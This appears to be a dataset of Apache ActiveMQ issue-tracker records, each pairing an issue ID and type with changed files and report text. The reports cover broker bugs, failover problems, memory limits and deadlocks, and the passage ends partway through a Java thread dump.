changed files:
texts:maven 2 build for activemq, activecluster & activeio
make activemq m2 friendlyI"ve got a start here and I"m adding the pom.xml for activeio now, will add the rest as its done.To get this build to work you need to add ibmaio to your local repo download the package from ibm here;https://www7b.software.ibm.com/dl/AW-0H8/AW-0H8-punpack the zip and install the file like this;mvn install:install-file -Dfile=./ibmaio.jar -DartifactId=ibmaio -DgroupId=ibmaio -Dversion=1.0 -Dpackaging=jarThe build activeiomvn -Dmaven.test.skip=true install
issueID:AMQ-4426
type:New Feature
changed files:
texts:Allow XAPooledConnectionFactory to be used from ee ( implement ObjectFactory, [Queue|Topic]ConnectionFactory
To easily bind a connection factory that is aware of the containers transaction manager(tm) the use of javax.naming ObjectFactory comes in handy.This allows the connection factory to create instances from a jndi lookup.Having the tm resolved from jndi at runtime makes sense to avoid wiring dependencies.Having the XAPooledConnectionFactory implement the ee type Queue and Topic connection factory interfaces makes such a factory useable.
issueID:AMQ-4427
type:Bug
changed files:
texts:Many of the activemq-http tests are failing on Jenkins
260 out of 454 failed on the last run, mostl with "java.net.BindException: Address already in use"
issueID:AMQ-4428
type:Bug
changed files:IntrospectionSupport.java
texts:Don&#39;t swallow errors in IntrospectionSupport.setProperty
`setProperty` currently ends with `… catch (Throwable ignore) { return false; }`. This can make troubleshooting invalid configuration much harder since the exception (that contains detailed information) is hidden from the user.
issueID:AMQ-4432
type:Bug
changed files:
texts:Validate camel context within activemq.xml in karaf
Validate use case in xml config as follows: <beans>    <broker xmlns="http://activemq.apache.org/schema/core"            brokerName="${broker-name}"            dataDirectory="${data}"            start="false" />    ...    <camelContext id="camel" xmlns="http://camel.apache.org/schema/spring">        <route id="queueToDbTransacted">            <from uri="activemq:queue:camel_in"/>            <to uri="activemq:queue:camel_out"/>        </route>    </camelContext></beans>
issueID:AMQ-4433
type:Improvement
changed files:
texts:Socket parameters are not validated
Connect parameters are validated in every transport factory with a statement like this:if (!options.isEmpty()) {  throw new IllegalArgumentException("Invalid connect parameters: " + options);}Socket parameters (i.e. connect parameters prefixed with socket.) are however never validated.They are put away atTcpTransportFactory.compositeConfigure(Transport, WireFormat, Map) line: 85 and then set atTcpTransport.initialiseSocket(Socket) line: 428where there is no check that socketOptions is empty after the call.I"ve attached a patch (#1) that rectifies this.Bonus: I found similar issues in the transport classes. See patch #2 and #3.
issueID:AMQ-4435
type:Bug
changed files:ActiveMQConnectionFactory.java
texts:ActiveMQConnectionFatory should populate "consumerFailoverRedeliveryWaitPeriod"
ActiveMQConnectionFactory contains "consumerFailoverRedeliveryWaitPeriod" to be applied to the connection created - however method "populateProperties()" ignores this property.The following should be added to populateProperties() methodprops.setProperty("consumerFailoverRedeliveryWaitPeriod", Long.toString(consumerFailoverRedeliveryWaitPeriod));
issueID:AMQ-4437
type:Bug
changed files:
texts:JUnit deprecation warnings
When compiling the ActiveMQ trunk using Java 7, I get:&#91;WARNING&#93; ~activemq/activemq-stomp/src/test/java/org/apache/activemq/transport/stomp/StompVirtualTopicTest.java:&#91;31,22&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecated&#91;WARNING&#93; ~activemq/activemq-stomp/src/test/java/org/apache/activemq/transport/stomp/StompVirtualTopicTest.java:&#91;133,12&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecated&#91;WARNING&#93; ~activemq/activemq-stomp/src/test/java/org/apache/activemq/transport/stomp/StompVirtualTopicTest.java:&#91;192,20&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecated&#91;WARNING&#93; ~activemq/activemq-pool/src/test/java/org/apache/activemq/pool/PooledConnectionFactoryTest.java:&#91;30,22&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecated&#91;WARNING&#93; ~activemq/activemq-pool/src/test/java/org/apache/activemq/pool/PooledConnectionFactoryMaximumActiveTest.java:&#91;19,22&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecated&#91;WARNING&#93; ~activemq/activemq-pool/src/test/java/org/apache/activemq/pool/PooledConnectionTest.java:&#91;73,3&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecated&#91;WARNING&#93; ~activemq/activemq-pool/src/test/java/org/apache/activemq/pool/PooledConnectionTest.java:&#91;84,3&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecated&#91;WARNING&#93; ~activemq/activemq-pool/src/test/java/org/apache/activemq/pool/PooledConnectionTest.java:&#91;98,2&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecated&#91;WARNING&#93; ~activemq/activemq-pool/src/test/java/org/apache/activemq/pool/PooledConnectionFactoryTest.java:&#91;216,12&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecated&#91;WARNING&#93; ~activemq/activemq-pool/src/test/java/org/apache/activemq/pool/PooledConnectionFactoryTest.java:&#91;251,20&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecated&#91;WARNING&#93; ~activemq/activemq-pool/src/test/java/org/apache/activemq/pool/PooledConnectionFactoryMaximumActiveTest.java:&#91;112,8&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecated&#91;WARNING&#93; ~activemq/activemq-pool/src/test/java/org/apache/activemq/pool/PooledConnectionFactoryMaximumActiveTest.java:&#91;115,8&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecated&#91;WARNING&#93; ~activemq/activemq-spring/src/test/java/org/apache/activemq/usecases/AMQDeadlockTest3.java:&#91;37,22&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecated&#91;WARNING&#93; ~activemq/activemq-spring/src/test/java/org/apache/activemq/usecases/AMQFailoverIssue.java:&#91;95,12&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecated&#91;WARNING&#93; ~activemq/activemq-spring/src/test/java/org/apache/activemq/usecases/AMQDeadlockTest3.java:&#91;114,12&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecated&#91;WARNING&#93; ~activemq/activemq-spring/src/test/java/org/apache/activemq/usecases/AMQDeadlockTest3.java:&#91;165,12&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecated&#91;WARNING&#93; ~activemq/activemq-spring/src/test/java/org/apache/activemq/usecases/AMQDeadlockTest3.java:&#91;217,12&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecated&#91;WARNING&#93; ~activemq/activemq-unit-tests/src/test/java/org/apache/activemq/network/NetworkLoopBackTest.java:&#91;26,29&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecated&#91;WARNING&#93; ~activemq/activemq-fileserver/src/test/java/org/apache/activemq/util/HttpBlobTest.java:&#91;57,8&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecated&#91;WARNING&#93; ~activemq/activemq-fileserver/src/test/java/org/apache/activemq/util/HttpBlobTest.java:&#91;68,8&#93; &#91;deprecation&#93; Assert in junit.framework has been deprecatedThis is probably something worth fixing...
issueID:AMQ-4438
type:Improvement
changed files:BstatCommand.java
texts:Add uptime to bstat output
bstat command would benefit from displaying the new uptime attribute.
issueID:AMQ-4441
type:Bug
changed files:
texts:Race condition in PooledConnectionFactory.createConnection
`PooledConnectionFactory.createConnection(String userName, String password)` can return broken Connection. By `broken` I mean PooledConnection with referenceCount==1, but without underlying ActiveMQConnection.The problem is in lines connection = connectionsPool.borrowObject(key);...return new PooledConnection(connection);While method `borrowObject` validates the connection and `new PooledConnection` increments referenceCount, it"s possible that some thread calls `ConnectionPool.decrementReferenceCount()` just between `borrowObject` and `new PooledConnection`. referenceCount at this stage can be a zero and the ConnectionPool became closed just prior to `new PooledConnection`.
issueID:AMQ-4461
type:Bug
changed files:
texts:Priority backup with mulitple brokers
There"s a problem with priority backup when multiple brokers are involved. The priority url is not put on the head of the list.
issueID:AMQ-4463
type:Bug
changed files:
texts:org.apache.activemq.bugs.AMQ4368Test.testENTMQ220 fails intermittently
This fails occasionally with the following messages because of a race condition at startup:java.lang.AssertionError: No messages received on iteration: 0
issueID:AMQ-4464
type:Bug
changed files:
texts:NonBlocking redelivery redelivers messages in reverse order.
Non-blocking redelivery enabled causes messages to be redelivered in reverse order.  Also the dispatched message list isn"t cleared quickly enough so a short redelivery delay can cause unmatched acks to go out when the async rollback task fires.
issueID:AMQ-4467
type:Bug
changed files:
texts:Memory usage percent can be exceeded much if PFC is disabled
If PFC is disabled, when the store cursor checks limits, it checks only the memory percentage of its own MemoryUsage and compares it to the high water mark. Otherwise if PFC is enabled, it checks whether the MemoryUsage is "full" but the "isFull" method also checks its parents.This issue arrises when you have memory limits set on queues higher than the overall system limit, as well as if you have multiple queues who"s memory limits combined are higher than the overall system limit. These settings must be taken into account.The original form can be found at http://activemq.2283324.n4.nabble.com/What-can-be-reason-of-460-memory-usage-limit-td4665651.html
issueID:AMQ-4468
type:Bug
changed files:
texts:TimeStampPlugin doesn&#39;t work with Stomp
Stomp producers cannot set the JMSTimestamp or timestamp header. Activemq always adds a timestamp header and overrides a set value. Therefore, the expires header cannot be recalculated according to Activemq time according to the description for TimeStampPlugin. TimeStampPlugin works for JMS producers because the JMSExpiration UTC can be adjusted up/down according to the difference between JMSTimestamp and Activemq UTC.Example:ActiveMQ time is 2pm UTCStomp producer time is 1:03pm UTC.Stomp expires time is 1:03pm + 15 minutes: 1:18pm UTC.ActiveMQ will throw this message away with TimeStampPlugin enabled.ActiveMQ will deliver this message for a JMSProducer.Recommendation:1)ActiveMQ should allow Stomp producers to set a timestamp or JMSTimestamp header.if( Stomp Message Timestamp Header ) {use header}else {add timestamp header}2)Add the disableTimeStampsByDefault=true feature to the stomp protocol URI.
issueID:AMQ-4469
type:Bug
changed files:
texts:Maximum connections control can not work in concurrent environment
The test case demonstrates that you can create even more connections than the maximum size.
issueID:AMQ-4471
type:Bug
changed files:
texts:Inconsistent messages with the WebSocket/Stomp Demo
Playing with the "demo/websocket/index.html" demo (5.8.0), I see an inconsistent messaging behavioirHaving two browsers (FF and chrome) and not always the message receives the other browser TEST in FF => displayed in Chrome (and FF) TEST (1) in Chrome => displayed in both TEST (2) in Chrome => this time, only visible in Chrome; no message arrived at the Firefox browser
issueID:AMQ-4472
type:Bug
changed files:
texts:consumer.close() on transacted session does not release prefetched messages
When using transactions an issue can arise where the consumer has messages in it"s prefetch and when consumer.close() is called the consumer is not closed and does not release the messages.  The use case is as follows:1) Create producer2) Create consumer3) Send message to queue4) Commit session5) Send a new message6) Close the consumer7) Start a new consumer8) Try to receive the messageTest case will be attached shortly.
issueID:AMQ-4473
type:Improvement
changed files:CreateCommand.java
texts:Allow enabling remote debug from newly created broker instance
You can create new instances of the broker using ./activemq create <brokerPath/brokerName> which will create a new directory with separate configuration and bin scripts. The bin scripts point to the ${activemq.home} which ends up being the parent, but I often times when quickly checking out a feature or debugging.. I wish to enable remote debugging from one of these new instances instead of having to enable it in the parent script.
issueID:AMQ-4475
type:Bug
changed files:
texts:NullPointerException with IndividualDeadLetterStrategy and TimeStampBrokerPlugin
When using the IndividualDeadLetterStrategy and and the TimestampBrokerPlugin if a Message is forwarded from one Queue to another over the VM Transport you get a NullPointerExceptionWe are getting the null pointer below when using TimeStampingBrokerPlugin & IndividualDeadLetterStrategy:Caused by: java.lang.NullPointerException at org.apache.activemq.broker.region.policy.IndividualDeadLetterStrategy.getDeadLetterQueueFor(IndividualDeadLetterStrategy.java:44) at org.apache.activemq.broker.util.TimeStampingBrokerPlugin.isDestinationDLQ(TimeStampingBrokerPlugin.java:148) at org.apache.activemq.broker.util.TimeStampingBrokerPlugin.send(TimeStampingBrokerPlugin.java:105) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:450) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:680) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:294) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:152) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:241) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47)
issueID:AMQ-4482
type:Improvement
changed files:
texts:Suport systemUsage.memoryUsage.percentOfJvmHeap=70 option
When sizing the memory limits of the broker, it would be nice to be able to prescribe that some precent of the jvm heap is always available. Such that jvm options -Xmx can be sensibly used to increase the message memory usage capacity of a brokerSupport for a "%" appendage to the existing limit or a new attribute percentOfJvmHeap, something like that.
issueID:AMQ-4483
type:New Feature
changed files:DestinationViewMBean.java
DeadLetterStrategy.java
DestinationFilter.java
SharedDeadLetterStrategy.java
QueueViewMBean.java
Queue.java
QueueView.java
BaseDestination.java
DestinationView.java
Destination.java
IndividualDeadLetterStrategy.java
texts:Improve DLQ handling
Provide the way to see if destination is DLQ and retry all messages in it.
issueID:AMQ-4484
type:Bug
changed files:
texts:NetworkConnectors create a consumer for queue://
At least for duplex NetworkConnectors a consumer for queue:// is added on the remote broker, if there are no statically included destinations.This is caused by the string "[]" incorrectly converted to a list with one element, instead of an empty list.The attached patch fixes the problem.
issueID:AMQ-4485
type:Bug
changed files:
texts:Skipped message dispatch with concurrent transacted sends at cursor memory limit
With multiple concurrent transacted sends, transaction synchronisation after completions are used to update the cursors.These happen independent of the order that the store is updated, and hence the store order index.When the cache is exhausted, a callback to the store to mark the end of caching assumes matching order. If scheduling has swapped the order, it is possible to mark the order index past what is cached and it is possible to skip a dispatch. Alternatively it is possible to mark too early which results in duplicate dispatch if the audit is disabled or exhausted.The senario that exposed this occurrence used concurrent transacted sends to 100 destinations with slow consumers. Leaving scope for out of order processing and ensuring that the cache is exhausted.Using a large destination memory limit or systemUsage limit or useCache=false policy entry will avoid this problem. The order is only important when the cache is exhausted.In the skipped case, the message appears on the queue but is not consumable, however it is consumable after a restart.The proper fix is to ensure cursors are updated in the same order as the store.
issueID:AMQ-4486
type:Bug
changed files:
texts:ActiveMQResourceAdapter.getXARessources() broken
The Implementation of ActiveMQResourceAdapter.getXAResources() is broken.Its internal call to makeConnection() creates a non-XA ActiveMQConnectionFactory which is then discarded as this ConnectionFactory is not XA-aware. As a result an empty XAResources array is returned.This causes transaction recovery in the application server to fail.Where the resource adapter can be manually configured (with beans for example) it is possible to work around by injecting the connection factory as an XA aware variant.
issueID:AMQ-4487
type:Bug
changed files:
texts:java.lang.OutOfMemoryError: Java heap space
Hi,When we browse a queue in webconsole we are getting java.lang.OutOfMemoryError: Java heap space. Memory allocation -----> -Xms512m -Xmx3GWhen we try to click the queue to view the messages below error is occurring. We recently moved from 5.7 to 5.8 version. We dint face this issue in 5.7 version.Kindly help in fixing the issue.java.lang.OutOfMemoryError: Java heap space        at java.util.Arrays.copyOf(Arrays.java:2882)        at java.io.CharArrayWriter.write(CharArrayWriter.java:88)        at java.io.PrintWriter.write(PrintWriter.java:382)        at com.opensymphony.module.sitemesh.filter.RoutablePrintWriter.write(RoutablePrintWriter.java:144)        at org.apache.jasper.runtime.JspWriterImpl.flushBuffer(JspWriterImpl.java:181)        at org.apache.jasper.runtime.JspWriterImpl.write(JspWriterImpl.java:449)        at org.apache.jasper.runtime.JspWriterImpl.write(JspWriterImpl.java:462)        at org.apache.jsp.browse_jsp$browse_jspHelper.invoke0(org.apache.jsp.browse_jsp:382)        at org.apache.jsp.browse_jsp$browse_jspHelper.invoke(org.apache.jsp.browse_jsp:450)        at org.apache.jsp.tag.web.jms.forEachMessage_tag.doTag(org.apache.jsp.tag.web.jms.forEachMessage_tag:89)        at org.apache.jsp.browse_jsp._jspx_meth_jms_forEachMessage_0(org.apache.jsp.browse_jsp:170)        at org.apache.jsp.browse_jsp._jspService(org.apache.jsp.browse_jsp:100)        at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:109)        at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)        at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:389)        at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:486)        at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:380)        at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)        at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:652)        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1329)        at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83)        at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300)        at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:45)        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300)        at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:102)        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300)        at com.opensymphony.sitemesh.webapp.SiteMeshFilter.obtainContent(SiteMeshFilter.java:129)        at com.opensymphony.sitemesh.webapp.SiteMeshFilter.doFilter(SiteMeshFilter.java:77)        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300)        at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:445)        at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:137)Thank you.Regards,Subathra.
issueID:AMQ-4488
type:Improvement
changed files:MessageDatabase.java
texts:KahaDB should log a warning for recovered prepared XA Transactions on startup.
On startup KahaDB should log a warning to inform that it found prepared XA transactions that weren"t committed or rolled back before ActiveMQ stopped.  These may need to be rolled back manually so its good to log their presence as it can lead to confusion otherwise since these could affect things like reported queue size etc.
issueID:AMQ-449
type:Bug
changed files:
texts:PooledConnection seems to close all of the sessions when the connection is closed
None
issueID:AMQ-4495
type:Bug
changed files:
texts:Improve cursor memory management
As currently stands, the store queue cursor will cache producer messages until it gets to the 70% (high watermark) of its usage. After that caching stops and messages goes only in store. When consumers comes, messages get dispatched to it, but memory isn"t released until they are acked. The problem is with the use case where producer flow control is off and we have a prefetch large enough to get all our messages from the cache. Then, basically the cursor gets empty and as message acks release memory one by one, we go to the store and try to batch one message at the time. You can guess that things start to be really slow at that point. The solution for this scenario is to wait with batching until we have more space so that store access is optimized. We can do this by adding a new limit (smaller then the high watermark) which will be used as the limit after which we start filling cursor from the store again.All this led us to the following questions:1. Why do we use 70% as the limit (instead of 100%) when we stop caching producer messages?2. Would a solution that stop caching producer messages at 100% of usage and then start batching messages from the store when usage drops below high watermark value be enough. Of course, high watermark would be configurable, but 100% by default so we don"t alter any behavior for regular use cases.
issueID:AMQ-4500
type:Bug
changed files:
texts:Changes to AMQ2832Test cause SparseAckReplayAfterStoreCleanupLevelDBStoreTest to fail
SparseAckReplayAfterStoreCleanupLevelDBStoreTest extends AMQ2832Test but uses LevelDB.  The test case testAlternateLossScenario is dependent on KahaDB, so it fails under SparseAckReplayAfterStoreCleanupLevelDBStoreTest.I"ll add a patch which skips this test when using LevelDB.
issueID:AMQ-4501
type:Bug
changed files:FailoverTransport.java
texts:Failover priorityBackup doesn&#39;t work if client accepts updates to its list of known URIs from the broker.
If a client has priorityBackup enabled and connects to a broker in a cluster with updateClusterClients="true" in its transport connector, the client ignores the priorityBackup flag it connects to any URI received from the broker, even if that URI doesn"t have priority.This is easy to reproduce adding a test case to the activemq-unit-tests/src/test/java/org/apache/activemq/transport/failover/FailoverPriorityTest.java test suite.
issueID:AMQ-4504
type:Bug
changed files:
texts:Stalled pending message dispatch to composite destination consumer
With a backlog of messages on N destinations that exceeds the prefetch of the composite consumer for N, it is possible for dispatch on one destination to find the subscription full with messages from the other destinations.If there are no pending messages for that destination it won"t get an ack and hence won"t attempt to dispatch again till there is another send. Leading to stalled pending messages.The solution is to have a subscription wakeup all destination it is subscribed to once its dispatch list is exhausted.
issueID:AMQ-4505
type:Bug
changed files:
texts:Client doesn&#39;t fail over to other broker if updateClusterClientsOnRemove = true
When a cluster of brokers have updateClusterClients="true" rebalanceClusterClients="true" updateClusterClientsOnRemove="true" in the transport connector and a client connects including only one broker address. If the broker the client is connected to stops, it doesn"t failover to the other ones. This happens when updateClusterClientsOnRemove=true, if it"s false client fails over to the other brokers.
issueID:AMQ-4507
type:Bug
changed files:FailoverTransport.java
texts:FailoverTransport throws NullPointerException
The Failovertransport throws NullPointer Exceptions in case of a failover to another primary host for the following broker url:failover:(tcp://primary_1:61616,tcp://primary_2:61616,tcp://secondary_1:61616,tcp://secondary_2:61616)?randomize=false&priorityBackup=true&priorityURIs=tcp://primary_1:61616,tcp://primary_2:61616&jms.alwaysSyncSend=trueStack trace:Exception in thread "ActiveMQ Task-2" java.lang.NullPointerException at org.apache.activemq.transport.failover.FailoverTransport.disposeTransport(FailoverTransport.java:231) at org.apache.activemq.transport.failover.FailoverTransport.doReconnect(FailoverTransport.java:954) at org.apache.activemq.transport.failover.FailoverTransport$2.iterate(FailoverTransport.java:143) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603) at java.lang.Thread.run(Thread.java:722)I assume that this is a copy-paste bug, since in the current revision (1478184, see link below) of the FailoverTransport on line #966, the variable "old" should be checked for null instead of "transport". However, I have no clue why "old" is null even though the transport was handling messages before the failover.http://svn.apache.org/viewvc/activemq/trunk/activemq-client/src/main/java/org/apache/activemq/transport/failover/FailoverTransport.java?revision=1478184&view=markupCurrent code:955 Transport old = this.connectedTransport.getAndSet(null);966 if (transport != null) {967   disposeTransport(old);968 }Corrected code:955 Transport old = this.connectedTransport.getAndSet(null);966 if (old!= null) {967   disposeTransport(old);968 }
issueID:AMQ-4509
type:New Feature
changed files:StopBrokerMojo.java
pom.xml
Broker.java
StartBrokerMojo.java
BrokerMojo.java
texts:activemq-maven-plugin should have a stop goal
The maven-activemq-plugin (aka activemq-maven-plugin) in a multi-module Maven project, we would like to stop and start ActiveMQ for each module where it is needed (a "stop" and "start" goal, rather than a "run" goal with a shutdown hook). We cannot run an individual module of our multi-module project because we can only start ActiveMQ once for our aggregate pom.xml. This approach would also resolve AMQ-1628 in a different way than was suggested. The approach we are suggesting is similar to how the cargo plugin handles tomcat.
issueID:AMQ-451
type:New Feature
changed files:JobFacade.java
texts:allow scheduled delivery of messages
rather than be dispatched immediately it would be good to support a custom header to indicate the delivery some time in the future.
issueID:AMQ-4512
type:Bug
changed files:
texts:MemoryUsage waitForSpace in inconsistent state
There is a race condition in MemoryUsage which makes it possible for it to be left in an inconsistent state and thereby hang any clients in waitForSpace().The core issue is in the following block of code:    public void decreaseUsage(long value) {        if (value == 0) {            return;        }        int percentUsage;        synchronized (usageMutex) {            usage -= value;            percentUsage = caclPercentUsage();        }        setPercentUsage(percentUsage);        if (parent != null) {            parent.decreaseUsage(value);        }    }The bug occurs when multiple threads are calling increment/decrement at same time. Since the field "usage" is protected with the usageMutex each writer/reader will see the correct and current value for usage and calculate the right value for percentUsage at that instant. "setPercentUsage" is also   protected by the same usageMutex so we resyncronize on usageMutex to set the percentUsage field as well. The issue is that threads may enter the setPercentUsage synchronized block in a different order than they entered the percentUsage "calculating" block. Since percentUsage is carried between the two blocks, a reordering of threads can allow the wrong final percentUsage value to be set. Possible threading (imagine usage starts at 0 and limit is 100).Thread #1 - usage += 150; percentUsage = 150;Thread #1 - suspended before called setPercentUsageThread #2 - usage -= 150; percentUsage = 0;Thread #2 - setPercentUsage(0);Thread #1 - resumed, can now call setPercentUsageThread #1 - setPercentUsage(150);Final value = 150This same pattern of synchronizing to calculate the percentUsage and then setting the value later is repeated in all of the Usage objects I looked at. My guess it was written this way to avoid holding locks while making calls out to "untrusted code" but it is a very dangerous way to do the calculations. The most surprising thing is the locks are still being explicitly held while calling fireEvent anyways.I have attached two screenshots taken using a debugger of two threads that have both been stalled for multiple minutes on "waitForSpace" trying to publish to the same queue. Notice they both have a "usage" of 0 but a "percentUsage" > 100, this should be impossible. To get the system into this state I was using JmsTemplate and a CachingConnectionFactory to publish on 8 threads and a single DefaultMessageListenerContainer who is pulling the messages off as fast as possible. The test publishes 100000 measurements and around ~75% of the time atleast a few producers end up stalled in waitForSpace() even though the queue is ready for more messages. I can also reproduce these results using JmsTemplate and PooledConnectionFactory so I don"t believe it"s an issue in the pooling implementations.
issueID:AMQ-4513
type:Bug
changed files:
texts:Deadlock can occur on dispose of TempQueue that contains expired Messages
When a TempQueue is being torn down and it contains expired Messages its possible for a deadlock occurs if the advisory for expired Message or DLQd fires at the same time as another Destination is created on the Broker.Found one Java-level deadlock:============================="ActiveMQ Transport: tcp:///127.0.0.1:53182@60490":  waiting to lock monitor 0x00007f9630020c80 (object 0x00000007c4541ff0, a java.util.concurrent.ConcurrentHashMap),  which is held by "ActiveMQ Transport: tcp:///127.0.0.1:53158@60490""ActiveMQ Transport: tcp:///127.0.0.1:53158@60490":  waiting for ownable synchronizer 0x00000007c4600f98, (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync),  which is held by "ActiveMQ Transport: tcp:///127.0.0.1:53099@60490""ActiveMQ Transport: tcp:///127.0.0.1:53099@60490":  waiting to lock monitor 0x00007f9630020c80 (object 0x00000007c4541ff0, a java.util.concurrent.ConcurrentHashMap),  which is held by "ActiveMQ Transport: tcp:///127.0.0.1:53158@60490"Java stack information for the threads listed above:==================================================="ActiveMQ Transport: tcp:///127.0.0.1:53182@60490": at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:271) - waiting to lock <0x00000007c4541ff0> (a java.util.concurrent.ConcurrentHashMap) at org.apache.activemq.broker.region.RegionBroker.addDestinationInfo(RegionBroker.java:297) at org.apache.activemq.advisory.AdvisoryBroker.addDestinationInfo(AdvisoryBroker.java:189) at org.apache.activemq.broker.BrokerFilter.addDestinationInfo(BrokerFilter.java:217) at org.apache.activemq.broker.BrokerFilter.addDestinationInfo(BrokerFilter.java:217) at org.apache.activemq.broker.MutableBrokerFilter.addDestinationInfo(MutableBrokerFilter.java:223) at org.apache.activemq.broker.TransportConnection.processAddDestination(TransportConnection.java:527) at org.apache.activemq.command.DestinationInfo.visit(DestinationInfo.java:122) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:329) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:184) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:722)"ActiveMQ Transport: tcp:///127.0.0.1:53158@60490": at sun.misc.Unsafe.park(Native Method) - parking to wait for  <0x00000007c4600f98> (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:186) at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:834) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:867) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1197) at java.util.concurrent.locks.ReentrantReadWriteLock$WriteLock.lock(ReentrantReadWriteLock.java:945) at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:128) at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:279) - locked <0x00000007c4541ff0> (a java.util.concurrent.ConcurrentHashMap) at org.apache.activemq.broker.region.RegionBroker.addDestinationInfo(RegionBroker.java:297) at org.apache.activemq.advisory.AdvisoryBroker.addDestinationInfo(AdvisoryBroker.java:189) at org.apache.activemq.broker.BrokerFilter.addDestinationInfo(BrokerFilter.java:217) at org.apache.activemq.broker.BrokerFilter.addDestinationInfo(BrokerFilter.java:217) at org.apache.activemq.broker.MutableBrokerFilter.addDestinationInfo(MutableBrokerFilter.java:223) at org.apache.activemq.broker.TransportConnection.processAddDestination(TransportConnection.java:527) at org.apache.activemq.command.DestinationInfo.visit(DestinationInfo.java:122) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:329) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:184) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:722)"ActiveMQ Transport: tcp:///127.0.0.1:53099@60490": at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:271) - waiting to lock <0x00000007c4541ff0> (a java.util.concurrent.ConcurrentHashMap) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145) at org.apache.activemq.advisory.AdvisoryBroker.addDestination(AdvisoryBroker.java:174) at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145) at 